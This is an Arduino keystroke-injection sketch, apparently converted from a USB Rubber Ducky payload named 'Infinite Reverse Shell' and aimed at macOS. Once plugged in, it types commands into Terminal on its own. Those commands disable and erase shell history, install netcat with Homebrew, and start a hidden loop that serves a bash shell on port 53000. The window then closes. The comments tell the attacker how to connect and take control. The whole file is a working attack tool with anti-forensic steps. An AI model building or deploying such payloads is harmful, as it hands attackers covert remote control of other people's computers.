// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // This script installs netcat using home-brew (can adjust delay)
  // Sets up a continuous loop using netcat to establish a connection
  // and execute a bash shell every 180 seconds.
  // Now on your separate computer in your terminal Run the command 'nc <remote-ip> 53000'
  // replace '<remote-ip>' with the IP address of the target computer.
  // I've noticed that NC does not respond if you copy and paste so please type the I.P. out!
  // If the connection is successful, you should now have a remote shell session on the remote computer.
  // To kill the listening port (53000 in this case) use the command below
  // killall nc
  // Requirements: install netcat on both the remote target and your computer 'brew install netcat'
  // Requirements: Remote computer's IP address or hostname
  // Title: Infinite Reverse Shell.txt
  // Author: NARSTY
  // Target: MacOS
  // Version: 1.0
  // Category: Recon
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("echo -e \"export HISTCONTROL=ignorespace\\nunset HISTFILE\" >> ~/.bashrc && source ~/.bashrc && exec bash");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" brew install netcat");

  delay(500);

  typeKey(KEY_RETURN);

  delay(20000);

  Keyboard.print(" nohup bash -c 'while true; do nc -l -p 53000 -vvv -e /bin/bash; sleep 180; done' &");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('d');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}